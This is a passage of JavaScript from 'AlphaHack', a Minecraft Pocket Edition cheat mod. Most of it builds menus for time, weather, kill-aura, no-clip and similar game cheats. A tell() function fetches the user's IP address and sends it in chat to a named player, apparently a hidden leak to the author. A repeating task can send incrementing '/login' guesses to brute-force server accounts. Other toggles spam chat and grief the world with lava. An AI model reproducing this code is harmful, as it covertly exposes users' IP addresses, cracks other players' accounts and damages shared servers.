             mmenu.dismiss();
			}
		});
		mmenuLayout.addView(B_exit);

            mmenu = new PopupWindow(mmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            mmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            mmenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}


function WaMenu() {
ctx.runOnUiThread(new java.lang.Runnable({ run: function(){
        try{
            var wmenuLayout = new android.widget.LinearLayout(ctx);
            var wmenuScroll = new android.widget.ScrollView(ctx);
            var wmenuLayout1 = new android.widget.LinearLayout(ctx);
            wmenuLayout.setOrientation(1);
            wmenuLayout1.setOrientation(1);

            wmenuScroll.addView(wmenuLayout);
            wmenuLayout1.addView(wmenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		wmenuLayout.addView(MainTitle);

var wtitle = new android.widget.TextView(ctx); wtitle.setGravity(android.view.Gravity.CENTER);
		wtitle.setText("Weather Menu");
       wtitle.setTextColor(GUIName);
		wtitle.setTextSize(20);
		wmenuLayout.addView(wtitle);

            var button = new android.widget.Button(ctx);
            button.setText("Set wether");
            button.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Wset();
wmenu.dismiss();
//print("error with lighting");
                }
            }));
            wmenuLayout.addView(button);

var button2 = new android.widget.Button(ctx);
            button2.setText("Clear weather");
            button2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Level.setRainLevel(0);
Level.setLightningLevel(0);
                }
            }));
            wmenuLayout.addView(button2);

var w_exit = new android.widget.Button(ctx);
		w_exit.setText("Exit");
	   w_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             wmenu.dismiss();
showMenuBtn();
			}
		});
		wmenuLayout.addView(w_exit);

            wmenu = new android.widget.PopupWindow(wmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
          /*  wmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
wmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            wmenu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.CENTER | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function Wset() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var w = new android.widget.EditText(ctx);
var w2 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Set Weather");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(w);
Layer.addView(w2);
Layer.addView(Exit);

w.setText("");
w.setHint("Set rain/snow");
w2.setText("");
w2.setHint("Set lightning");
Exit.setText("Set weather");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
v=w.getText();
v2=w2.getText();
Dialog.dismiss();
WS();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The WS Dialog Is Malfunctioning:"+e);
}
}});
}

function WS() {
Level.setRainLevel(v);
Level.setLightningLevel(v2);
}                

function amenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var amenuLayout = new LinearLayout(ctx);
            var amenuScroll = new ScrollView(ctx);
            var amenuLayout1 = new LinearLayout(ctx);
            amenuLayout.setOrientation(1);
            amenuLayout1.setOrientation(1);
            amenuScroll.addView(amenuLayout);
            amenuLayout1.addView(amenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		amenuLayout.addView(MainTitle);
            
            var z_title = new android.widget.TextView(ctx); z_title.setGravity(android.view.Gravity.CENTER);
		z_title.setText("Time Menu");
       z_title.setTextColor(GUIName);
		z_title.setTextSize(20);
		amenuLayout.addView(z_title);

var exita = new android.widget.Button(ctx);
		exita.setText("Exit");
		exita.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             amenu.dismiss();
showMenuBtn();
			}
		});
		amenuLayout.addView(exita);

var aa = new android.widget.Button(ctx);
            aa.setText("Only day: "+(onlyday?"on":"off"));
            aa.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
                onlyday?onlyday=false:onlyday=true;
aa.setText("Only day: "+(onlyday?"on":"off"));
if(onlyday == true){
clientMessage("§7Only day is on");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 0");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time stop");
onlyday = true;
}
if(onlyday == false){
clientMessage("§7Only day is off");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time start");
onlyday = false;
                }
                }
            }));
            amenuLayout.addView(aa);

var a1 = new Button(ctx);
            a1.setText("Time: 6:00am");
            a1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(0);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 0");
                }
            }));
            amenuLayout.addView(a1);

var a2 = new Button(ctx);
            a2.setText("Time: 7:00am");
            a2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(1000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 1000");
                }
            }));
            amenuLayout.addView(a2);

var a3 = new Button(ctx);
            a3.setText("Time: 8:00am");
            a3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(2000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 2000");
                }
            }));
            amenuLayout.addView(a3);

var a4 = new Button(ctx);
            a4.setText("Time: 9:00am");
            a4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(3000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 3000");
                }
            }));
            amenuLayout.addView(a4);

var a5 = new Button(ctx);
            a5.setText("Time: 10:00am");
            a5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(4000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 4000");
                }
            }));
            amenuLayout.addView(a5);

var a6 = new Button(ctx);
            a6.setText("Time: 11:00am");
            a6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(5000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 5000");
                }
            }));
            amenuLayout.addView(a6);

var a7 = new Button(ctx);
            a7.setText("Time: 12:00pm");
            a7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(6000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 6000");
                }
            }));
            amenuLayout.addView(a7);

var a8 = new Button(ctx);
            a8.setText("Time: 1:00pm");
            a8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(7000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 7000");
                }
            }));
            amenuLayout.addView(a8);

var a9 = new Button(ctx);
            a9.setText("Time: 2:00pm");
            a9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(8000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 8000");
                }
            }));
            amenuLayout.addView(a9);

var a10 = new Button(ctx);
            a10.setText("Time: 3:00pm");
            a10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(9000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 9000");
                }
            }));
            amenuLayout.addView(a10);

var a11 = new Button(ctx);
            a11.setText("Time: 4:00pm");
            a11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(10000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 10000");
                }
            }));
            amenuLayout.addView(a11);

var a12 = new Button(ctx);
            a12.setText("Time: 5:00pm");
            a12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(11000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 11000");
                }
            }));
            amenuLayout.addView(a12);

var a13 = new Button(ctx);
            a13.setText("Time: 6:00pm");
            a13.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(12000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 12000");
                }
            }));
            amenuLayout.addView(a13);

var a14 = new Button(ctx);
            a14.setText("Time: 7:00pm");
            a14.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(13000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 13000");
                }
            }));
            amenuLayout.addView(a14);

var a15 = new Button(ctx);
            a15.setText("Time: 8:00pm");
            a15.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(14000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 14000");
                }
            }));
            amenuLayout.addView(a15);

var a16 = new Button(ctx);
            a16.setText("Time: 9:00pm");
            a16.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(15000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 15000");
                }
            }));
            amenuLayout.addView(a16);

var a17 = new Button(ctx);
            a17.setText("Time: 10:00pm");
            a17.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(16000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 16000");
                }
            }));
            amenuLayout.addView(a17);

var a18 = new Button(ctx);
            a18.setText("Time: 11:00pm");
            a18.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(17000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 17000");
                }
            }));
            amenuLayout.addView(a18);

var a19 = new Button(ctx);
            a19.setText("Time: 12:00am");
            
            a19.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(18000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 18000");
                }
            }));
            amenuLayout.addView(a19);

var a20 = new Button(ctx);
            a20.setText("Time: 1:00am");
            a20.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(19000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 19000");
                }
            }));
            amenuLayout.addView(a20);

var a21 = new Button(ctx);
            a21.setText("Time: 2:00am");
            a21.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(20000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 20000");
                }
            }));
            amenuLayout.addView(a21);

var a22 = new Button(ctx);
            a22.setText("Time: 3:00am");
            a22.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(21000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 21000");
                }
            }));
            amenuLayout.addView(a22);

var a23 = new Button(ctx);
            a23.setText("Time: 4:00am");
            a23.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(22000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 22000");
                }
            }));
            amenuLayout.addView(a23);

var a24 = new Button(ctx);
            a24.setText("Time: 5:00am");          
            a24.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(23000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 23000");
                }
            }));
            amenuLayout.addView(a24);
		
		var exita2 = new android.widget.Button(ctx);
		exita2.setText("Exit");
	   exita2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             amenu.dismiss();
showMenuBtn();
			}
		});
		amenuLayout.addView(exita2);

            amenu = new PopupWindow(amenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            amenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            amenu.showAtLocation(ctx.getWindow().getDecorView(), Gravity.CENTER | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function crash() {
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeForceCrash();
}

function tell(){
var chat = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat;

getIp(function(info){chat("/tell Arceus_matt using AlphaHack! ip " + info[0])})
}

function save() {
        var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/Spawn-home/", "Home "+name+".txt");
        var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/Spawn-home/" ; 
        java.io.File(path).mkdirs(); 
        file.createNewFile();
        var write = new java.io.OutputStreamWriter(new java.io.FileOutputStream(file));
        var string="";
        write.append(xhome.toString());
        write.append(","+ yhome.toString());
        write.append(","+ zhome.toString()); 
        write.close();
         
    } 
 
function load(){
 var line, string = "";
    var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/Spawn-home/", "Home "+name+".txt");
    var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/Spawn-home/"; 
    if(!file.exists()){
    clientMessage("The home doesn't exist"); 
  java.io.File(path).mkdirs(); 
    }
    else {
    var readfile = new java.io.BufferedReader(new java.io.FileReader(file));
    while((line = readfile.readLine()) != null) {
        var t1 = line + java.lang.System.getProperty("line.seperator");
        string += t1.substring(0, t1.length - 4);
        var t2 = line;
        if((line = readfile.readLine()) != null) string += "\n";
        line = t2;
    } 
    xhome=parseInt(string.split(",")[0]);    
    yhome= parseInt(string.split(",")[1]);
    zhome= parseInt(string.split(",")[2]);
    Entity.setPosition(Player.getEntity(),xhome,yhome,zhome);       
    }
}

function gameLoop(){
    var thisLoop = new Date;
    fps = 1000 / (thisLoop - lastLoop);
    lastLoop = thisLoop;
}

function modTick() {
if(showp){
ModPE.showTipMessage("Current FPS: " + Math.round(fps));
gameLoop()
}
if(nowalls) {
		Entity.setCollisionSize(getPlayerEnt(),0,0);
		if(Level.getTile(getPlayerX(),getPlayerY(),getPlayerZ())!=0 && Level.getTile(getPlayerX(),getPlayerY()-1,getPlayerZ())!=0) {
			setVelY(getPlayerEnt(), 0.01);
		}
}
if(waterwalk) {
		if(Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==8 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==9 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==10 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==11) {
			setVelY(getPlayerEnt(), 0);
		}
	}
if(highjumps) {
		if(Entity.getVelY(getPlayerEnt())< -0.1) {
			setVelY(getPlayerEnt(),-0.5);
		}
		if(Entity.getVelY(getPlayerEnt())< 0.35 && Entity.getVelY(getPlayerEnt())> 0.2 && can==1 && canGetHP==1) {
			setVelY(getPlayerEnt(), 0.6);
			can = 2;
			HP = Entity.getHealth(getPlayerEnt());
			canGetHP = 0;
		}
		if(Entity.getVelY(getPlayerEnt())>gravity && can==2) {
			Player.setHealth(HP);
			canGetHP = 1;
			can = 0;
		}
		if(Entity.getVelY(getPlayerEnt())==gravity && can==0) {
			Player.setHealth(HP);
			canGetHP = 1;
			can = 1;
		}
	}
if(stackheart){
Player.setHealth(20);
}
if(killaura)
{
var mobs = Entity.getAll();
for(var i=0; i<mobs.length; i++)
{
var x = Entity.getX(mobs[i])-getPlayerX();
var y = Entity.getY(mobs[i])-getPlayerY();
var z = Entity.getZ(mobs[i])-getPlayerZ();
if(x+y+z > 0 && mobs[i]!==getPlayerEnt())
{
Entity.setHealth(mobs[i], 0);
}
}
}
if(killfaura)
{
var mobs = Entity.getAll();
for(var i=0; i<mobs.length; i++)
{
var x = Entity.getX(mobs[i])-getPlayerX();
var y = Entity.getY(mobs[i])-getPlayerY();
var z = Entity.getZ(mobs[i])-getPlayerZ();
if(x+y+z > 0 && mobs[i]!==getPlayerEnt())
{
Entity.setImmobile(mobs[i], 0);
}
}
}
}

function attackHook(attacker, victim) {
	if(instakilled) {
		Entity.setHealth(victim, 1);
	}
	if(saddle) {
		rideAnimal(getPlayerEnt(), victim);
	}
}

function instaDestroy(){
if(instabreak==true)
	for(i = 0; i < 256; i++){
		Block.setDestroyTime(i, 0.1);
	}
}
 
function defaultDestroy(){
if(instabreak==false)
	for(i = 0; i < 256; i++){
		Block.setDestroyTime(i, defaultDestroyTime[i]);
	}
}

function rptask() {
    ctx.runOnUiThread(new java.lang.Runnable({
        run: function() {
            new android.os.Handler()
                .postDelayed(new java.lang.Runnable({
                    run: function() {
if(sspam)net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(text);
if(hackk)net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/login " + hackcount);
hackcount++
if(GUI!=null&&GUI.isShowing()==false&&(menu==null||menu.isShowing()==false)){
net.zhuoweizhang.mcpelauncher.ScriptManager.isRemote = true;
net.zhuoweizhang.mcpelauncher.ScriptManager.setLevelFakeCallback(true, false);
showMenuBtn();
}
if(onlyday)Level.setTime(0); 
if(healthy)healthIndicators(); 
if(stat22){
var parX = getPlayerX();
var parY = getPlayerY();
var parZ = getPlayerZ();
ModPE.showTipMessage("\n" + "X: " + Math.round(parX) + ", Y: " + Math.round(parY) + ", Z: " + Math.round(parZ) + ". " + "\n" + "G: " + Level.getGameMode() + "." + " T: " + Level.getTime() + "." + " W/L: " + Math.round(Level.getRainLevel()) + "/" + Math.round(Level.getLightningLevel()) + ". " + "ID: " + Player.getCarriedItem() + ":" + Player.getCarriedItemData() + "." + "\n" + Player.getName(Player.getEntity()) + " | " + "B: " + Level.getBiomeName() + "." + " v" + ModPE.getMinecraftVersion());
}
if(parti)Level.addParticle(ParticleType.lava, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
if(parti2)Level.addParticle(ParticleType.largeexplode, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
if(grief)Level.setTile(getPlayerX(), getPlayerY(), getPlayerZ(), 11, 0);
 if(checkForUpdate==false) {
        /*print("Checking for updates");*/
        ctx.runOnUiThread(new java.lang.Runnable({
            run: function() {
                try {
                    checkVersion();
                }
                catch(err) {
  print("Error: "+err);
                }
            }
        }));
        checkForUpdate=true;
    }
    if(updateWindow) {
        ctx.runOnUiThread(new java.lang.Runnable({
            run: function() {
                try {
                    updateVersion();
                }
                catch(err) {
                    print("Error: " + err);
                }
            }
        }));
        updateWindow=false;
}
if(cords)ModPE.showTipMessage("X:" + Math.round(nx) + " Y:" + Math.round(ny) + " Z:" + Math.round(nz));
                        nx = getPlayerX();
                        ny = getPlayerY();
                        nz = getPlayerZ();
                        eval(rptask());
                    }
                }),/* Milliseconds between every call*/ 1000 / 70);
        }
    }))
}
rptask();
